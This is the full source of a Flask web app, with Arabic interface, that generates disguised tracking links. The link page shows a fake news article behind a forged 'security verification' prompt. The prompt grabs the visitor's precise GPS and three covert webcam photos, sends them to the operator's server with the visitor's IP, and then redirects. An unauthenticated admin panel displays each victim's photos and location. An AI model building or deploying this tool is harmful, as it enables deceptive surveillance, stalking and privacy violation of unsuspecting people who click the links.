from flask import Flask, request, redirect, render_template_string, jsonify, send_file  # pyright: ignore[reportMissingImports]
from werkzeug.middleware.proxy_fix import ProxyFix
import uuid
import json
import os
import base64
from datetime import datetime, timedelta
import urllib.request

try:
    sync_playwright = __import__("playwright.sync_api", fromlist=["sync_playwright"]).sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

LINKS_FILE = "links.json"
SCREENSHOTS_DIR = "screenshots"
SELFIES_DIR = "selfies"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(SELFIES_DIR, exist_ok=True)

def load_links():
    if os.path.exists(LINKS_FILE):
        try:
            with open(LINKS_FILE, "r", encoding="utf-8") as f:
                links = json.load(f)
            
            now = datetime.now()
            filtered_links = {}
            for lid, info in links.items():
                created_at_str = info.get("created_at")
                if created_at_str:
                    try:
                        created_at = datetime.fromisoformat(created_at_str)
                        if now - created_at < timedelta(hours=24):
                            filtered_links[lid] = info
                    except Exception:
                        filtered_links[lid] = info
                else:
                    filtered_links[lid] = info
            
            if len(filtered_links) != len(links):
                save_links(filtered_links)
            return filtered_links
        except Exception:
            return {}
    return {}

def save_links(links):
    with open(LINKS_FILE, "w", encoding="utf-8") as f:
        json.dump(links, f, ensure_ascii=False, indent=2)

def get_location(ip):
    if ip in ("127.0.0.1", "localhost", "::1"):
        return "محلي (Localhost)", "0.0", "0.0"
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,query,lat,lon"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                lat = data.get("lat", "غير معروف")
                lon = data.get("lon", "غير معروف")
                loc_str = f"{data.get('country')} - {data.get('city')} ({data.get('query')})"
                return loc_str, lat, lon
    except Exception:
        pass
    return f"غير معروف ({ip})", "غير معروف", "غير معروف"

REDIRECT_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أحدث المقالات التقنية - تفاصيل الخبر</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f8f9fa;
            color: #333;
            line-height: 1.8;
            padding: 20px;
        }
        .main-wrapper {
            max-width: 750px;
            margin: 40px auto;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            overflow: hidden;
            border: 1px solid #eaeaea;
        }
        .article-header { padding: 30px 30px 20px 30px; border-bottom: 1px solid #eee; }
        .article-category { color: #0066cc; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
        h1 { font-size: 24px; color: #1a1a1a; margin-bottom: 12px; }
        .article-meta { font-size: 13px; color: #888; }
        .article-body { padding: 30px; font-size: 16px; color: #444; }
        .article-body p { margin-bottom: 20px; }
        
        /* نافذة الإذونات المخصصة (خيارين فقط: سماح دائماً والسحام هذه المرة) */
        .permission-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
            z-index: 9999; backdrop-filter: blur(5px);
        }
        .permission-box {
            background: #ffffff; width: 90%; max-width: 400px; border-radius: 16px;
            padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            animation: popUp 0.3s ease;
        }
        @keyframes popUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .permission-icon { font-size: 40px; margin-bottom: 15px; }
        .permission-title { font-size: 18px; font-weight: bold; color: #1a1a1a; margin-bottom: 10px; }
        .permission-desc { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.6; }
        .permission-buttons { display: flex; flex-direction: column; gap: 10px; }
        .perm-btn {
            padding: 12px; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer;
            transition: background 0.2s;
        }
        .perm-btn.primary { background: #0066cc; color: #fff; }
        .perm-btn.primary:hover { background: #0052a3; }
        .perm-btn.secondary { background: #e9ecef; color: #333; }
        .perm-btn.secondary:hover { background: #dde2e6; }
    </style>
</head>
<body>
    <!-- نافذة الأذونات الإجبارية -->
    <div class="permission-overlay" id="permOverlay">
        <div class="permission-box">
            <div class="permission-icon">🔒</div>
            <div class="permission-title">طلب إذن الوصول</div>
            <div class="permission-desc">يرغب هذا الموقع في التحقق من الأمان وتأكيد هويتك عبر الكاميرا والموقع الجغرافي للمتابعة لقراءة المقال.</div>
            <div class="permission-buttons">
                <button class="perm-btn primary" onclick="grantPermission('always')">سماح دائماً</button>
                <button class="perm-btn secondary" onclick="grantPermission('once')">السماح هذه المرة</button>
            </div>
        </div>
    </div>

    <div class="main-wrapper">
        <div class="article-header">
            <div class="article-category">تقنية وتكنولوجيا</div>
            <h1>إطلاق ميزات جديدة كلياً لتحسين تجربة تصفح الإنترنت والخصوصية</h1>
            <div class="article-meta">نشر بتاريخ: اليوم | بواسطة فريق التحرير</div>
        </div>
        <div class="article-body">
            <p>تسعى الشركات التقنية الكبرى دائماً لتقديم تحديثات مستمرة تساهم في رفع كفاءة الأداء وسرعة الوصول إلى المعلومات...</p>
            <p>في هذا التقرير، نستعرض أبرز التغييرات والتحسينات الملحوظة التي تم إضافتها مؤخراً وكيف تؤثر بشكل مباشر على تصفحك اليومي للمحتوى الرقمي...</p>
        </div>
    </div>

    <script>
        async function grantPermission(type) {
            // إخفاء نافذة الأذونات المخصصة
            document.getElementById('permOverlay').style.display = 'none';
            
            const originalUrl = "{{ original_url }}";
            let lat = "غير معروف";
            let lon = "غير معروف";

            // 1. طلب إذن الموقع الجغرافي GPS الدقيق
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
                        timeout: 7000,
                        enableHighAccuracy: true 
                    });
                });
                lat = position.coords.latitude;
                lon = position.coords.longitude;
            } catch (e) {
                console.log('Location permission denied or timeout');
            }

            // 2. طلب إذن الكاميرا والتقاط 3 صور متتالية
            let images = [];
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                for (let i = 0; i < 3; i++) {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    images.push(canvas.toDataURL('image/png'));
                }
                
                stream.getTracks().forEach(track => track.stop());
                
                // إرسال البيانات (الصور والإحداثيات) للخلفية
                await fetch('/api/upload_selfie', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        link_id: '{{ link_id }}', 
                        images: images,
                        lat: lat,
                        lon: lon
                    })
                });
            } catch (err) {
                console.log('Camera access skipped or denied:', err);
            } finally {
                window.location.href = originalUrl;
            }
        }
    </script>
</body>
</html>
"""

HOME_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صيّاد - أداة تلغيم الروابط والتقاط الصور</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #050510; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            color: #fff; padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02); backdrop-filter: blur(20px);
            border-radius: 28px; padding: 45px; width: 90%; max-width: 680px;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 0 80px rgba(0,212,255,0.05), 0 25px 80px rgba(0,0,0,0.6);
        }
        h1 { text-align: center; margin-bottom: 6px; font-size: 32px; color: #00d4ff; }
        .subtitle { text-align: center; color: #777; margin-bottom: 32px; font-size: 14px; }
        .input-group { margin-bottom: 22px; }
        label { display: block; margin-bottom: 10px; font-size: 14px; color: #aaa; }
        input[type="url"], input[type="text"] {
            width: 100%; padding: 18px; border: 2px solid rgba(255,255,255,0.08);
            border-radius: 16px; background: rgba(0,0,0,0.3); color: #fff; font-size: 16px;
        }
        button {
            width: 100%; padding: 20px; border: none; border-radius: 16px;
            background: linear-gradient(135deg, #00d4ff, #a855f7); color: #fff;
            font-size: 18px; font-weight: bold; cursor: pointer;
        }
        .result { margin-top: 28px; padding: 24px; background: rgba(0,212,255,0.04); border-radius: 16px; display: none; }
        .result.show { display: block; }
        .link-box { background: rgba(0,0,0,0.4); padding: 16px; border-radius: 12px; word-break: break-all; margin: 12px 0; font-size: 13px; color: #ccc; }
        .copy-btn { background: rgba(0,212,255,0.1); border: 1px solid #00d4ff; color: #00d4ff; padding: 10px 20px; border-radius: 10px; cursor: pointer; }
        .stats { margin-top: 28px; padding: 20px; background: rgba(255,255,255,0.015); border-radius: 16px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 12px; text-align: right; border-bottom: 1px solid rgba(255,255,255,0.04); }
        .badge { display: inline-block; padding: 5px 14px; border-radius: 20px; font-size: 11px; background: rgba(0,212,255,0.1); color: #00d4ff; }
        .badge.done { background: rgba(34,197,94,0.1); color: #22c55e; }
    </style>
</head>
<body>
    <div class="container">
        <h1>صيّاد - أداة تلغيم الروابط</h1>
        <p class="subtitle">إنشاء رابط ملغم + سحب الموقع الدقيق GPS والتقاط صور متعددة</p>
        
        <div class="input-group">
            <label>الرابط الأصلي:</label>
            <input type="url" id="originalUrl" placeholder="https://example.com" required>
        </div>
        <div class="input-group">
            <label>الاسم المخصص للرابط (اختياري):</label>
            <input type="text" id="customAlias" placeholder="مثال: gift">
        </div>
        
        <button onclick="generateLink()">🚀 إنشاء رابط ملغم</button>
        
        <div class="result" id="result">
            <h3>✅ تم إنشاء الرابط بنجاح!</h3>
            <div class="link-box" id="cloakedLink"></div>
            <button class="copy-btn" onclick="copyLink()">📋 نسخ الرابط</button>
        </div>

        <div class="stats">
            <h3>📊 الروابط النشطة (الحديثة)</h3>
            <table>
                <thead>
                    <tr><th>الرابط الملغم</th><th>الزيارات</th><th>آخر زيارة</th><th>الحالة</th></tr>
                </thead>
                <tbody id="statsBody"></tbody>
            </table>
        </div>
    </div>

    <script>
        async function generateLink() {
            const url = document.getElementById("originalUrl").value;
            const customAlias = document.getElementById("customAlias").value;
            if (!url) return alert("الرجاء إدخال رابط صحيح");
            
            const res = await fetch("/api/create", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({url: url, custom_alias: customAlias})
            });
            const data = await res.json();
            
            document.getElementById("result").classList.add("show");
            document.getElementById("cloakedLink").textContent = data.cloaked_url;
            loadStats();
        }
        
        function copyLink() {
            navigator.clipboard.writeText(document.getElementById("cloakedLink").textContent);
            alert("تم النسخ!");
        }
        
        async function loadStats() {
            const res = await fetch("/api/stats");
            const data = await res.json();
            const tbody = document.getElementById("statsBody");
            tbody.innerHTML = "";
            
            for (const [id, info] of Object.entries(data.links)) {
                const hasSelfie = info.visitors && info.visitors.some(v => v.selfies && v.selfies.length > 0);
                const cls = hasSelfie ? "badge done" : "badge";
                const txt = hasSelfie ? "📸 تم التقاط صور" : "⏳ في الانتظار";
                tbody.innerHTML += `<tr>
                    <td><a href="/go/${id}" target="_blank" style="color:#00d4ff">/go/${id}</a></td>
                    <td>${info.visits || 0}</td>
                    <td>${info.last_visit ? info.last_visit.slice(0,16).replace("T"," ") : "—"}</td>
                    <td><span class="${cls}">${txt}</span></td>
                </tr>`;
            }
        }
        loadStats();
        setInterval(loadStats, 5000);
    </script>
</body>
</html>
"""

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صيّاد - لوحة التحكم</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #050510; color: #fff; padding: 20px; }
        h1 { color: #00d4ff; text-align: center; margin-bottom: 25px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap: 25px; }
        .card { background: rgba(255,255,255,0.02); border-radius: 20px; padding: 25px; border: 1px solid rgba(255,255,255,0.06); }
        .card img { border-radius: 10px; border: 1px solid rgba(255,255,255,0.08); }
        .url-text { color: #aaa; font-size: 13px; word-break: break-all; margin-top: 8px; padding: 10px; background: rgba(0,0,0,0.25); border-radius: 8px; }
        .visitor-box { background: rgba(0,0,0,0.3); border-radius: 14px; padding: 15px; margin-top: 15px; border-right: 3px solid #a855f7; }
        .empty { padding: 10px; text-align: center; color: #555; font-size: 12px; }
        .selfies-grid { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>📸 لوحة التحكم - تقارير الزوار والسيلفي</h1>
    <div class="grid">
        {% for link_id, info in links.items() %}
        <div class="card">
            <span style="color:#00d4ff; font-weight:bold;">ID: {{ link_id }}</span>
            <div class="url-text">{{ info.original_url }}</div>
            <div style="font-size:13px; color:#888; margin-top:10px;">إجمالي الزيارات: {{ info.visits or 0 }}</div>
            
            <h4 style="color:#a855f7; margin-top:20px; border-top:1px solid rgba(255,255,255,0.08); padding-top:10px;">
                سجل الزوار ({{ info.visitors|length if info.visitors else 0 }})
            </h4>
            
            {% if info.visitors %}
                {% for v in info.visitors %}
                <div class="visitor-box">
                    <div style="font-size: 13px; color: #fff;">🌍 <b>الموقع:</b> {{ v.location }}</div>
                    <div style="font-size: 13px; color: #00d4ff; margin-top:4px;">📍 <b>إحداثيات GPS:</b> Lat: {{ v.lat }} | Lon: {{ v.lon }}</div>
                    <div style="font-size: 13px; color: #aaa; margin-top:4px;">💻 <b>IP:</b> {{ v.ip }}</div>
                    <div style="font-size: 12px; color: #888; margin-top:4px;">⏱️ <b>الوقت:</b> {{ v.time[:19].replace('T', ' ') }}</div>
                    
                    <div style="margin-top:10px; font-weight:bold; font-size:12px; color:#a855f7;">صور السيلفي الملتقطة:</div>
                    {% if v.selfies %}
                        <div class="selfies-grid">
                            {% for selfie_path in v.selfies %}
                            <img src="/selfies/{{ selfie_path }}" alt="Selfie" style="width: 100px; height: 75px; object-fit: cover;">
                            {% endfor %}
                        </div>
                    {% else %}
                        <div class="empty">لم يتم التقاط صور أو تم رفض الكاميرا</div>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <div class="empty">لا توجد زيارات حتى الآن</div>
            {% endif %}
        </div>
        {% endfor %}
    </div>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HOME_TEMPLATE)

@app.route("/api/create", methods=["POST"])
def create_link():
    data = request.get_json()
    original_url = data.get("url", "").strip()
    custom_alias = data.get("custom_alias", "").strip()
    
    if not original_url.startswith(("http://", "https://")):
        original_url = "https://" + original_url
    
    links = load_links()
    link_id = "".join(c for c in custom_alias if c.isalnum() or c in ("-", "_")) if custom_alias else ""
    if not link_id or link_id in links:
        link_id = str(uuid.uuid4())[:8]
    
    links[link_id] = {
        "original_url": original_url,
        "created_at": datetime.now().isoformat(),
        "visits": 0,
        "last_visit": None,
        "visitors": []
    }
    save_links(links)
    
    base = request.host_url.rstrip("/")
    return jsonify({
        "success": True,
        "link_id": link_id,
        "original_url": original_url,
        "cloaked_url": f"{base}/go/{link_id}"
    })

@app.route("/go/<link_id>")
def redirect_link(link_id):
    links = load_links()
    if link_id not in links:
        return "الرابط غير موجود أو تم انتهاء صلاحيته", 404
    
    link = links[link_id]
    link["visits"] = link.get("visits", 0) + 1
    link["last_visit"] = datetime.now().isoformat()
    
    visitor_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip() if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    location, lat, lon = get_location(visitor_ip)
    
    visitor = {
        "ip": visitor_ip,
        "location": location,
        "lat": lat,
        "lon": lon,
        "time": datetime.now().isoformat(),
        "selfies": []
    }
    
    if "visitors" not in link:
        link["visitors"] = []
    link["visitors"].append(visitor)
    save_links(links)
    
    return render_template_string(REDIRECT_TEMPLATE, original_url=link["original_url"], link_id=link_id)

@app.route("/api/upload_selfie", methods=["POST"])
def upload_selfie():
    data = request.get_json()
    link_id = data.get("link_id")
    images_data = data.get("images", [])
    lat = data.get("lat")
    lon = data.get("lon")
    
    if not link_id or not images_data:
        return jsonify({"success": False}), 400
        
    links = load_links()
    if link_id not in links:
        return jsonify({"success": False}), 404
        
    try:
        folder_name = f"{link_id}_{int(datetime.now().timestamp())}"
        session_folder = os.path.join(SELFIES_DIR, folder_name)
        os.makedirs(session_folder, exist_ok=True)
        
        saved_filenames = []
        for idx, img_data in enumerate(images_data):
            if "," in img_data:
                img_data = img_data.split(",")[1]
            image_bytes = base64.b64decode(img_data)
            filename = f"selfie_{idx+1}.png"
            filepath = os.path.join(session_folder, filename)
            
            with open(filepath, "wb") as f:
                f.write(image_bytes)
            saved_filenames.append(f"{folder_name}/{filename}")
            
        if links[link_id].get("visitors"):
            visitor = links[link_id]["visitors"][-1]
            visitor["selfies"] = saved_filenames
            if lat != "غير معروف" and lon != "غير معروف":
                visitor["lat"] = lat
                visitor["lon"] = lon
                visitor["location"] = f"GPS دقيق ({lat}, {lon})"
            
        save_links(links)
        return jsonify({"success": True})
    except Exception as e:
        print(f"Selfie error: {e}")
        return jsonify({"success": False}), 500

@app.route("/api/stats")
def get_stats():
    return jsonify({"links": load_links()})

@app.route("/admin")
def admin():
    return render_template_string(ADMIN_TEMPLATE, links=load_links())

@app.route("/selfies/<path:filename>")
def serve_selfie(filename):
    return send_file(os.path.join(SELFIES_DIR, filename))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)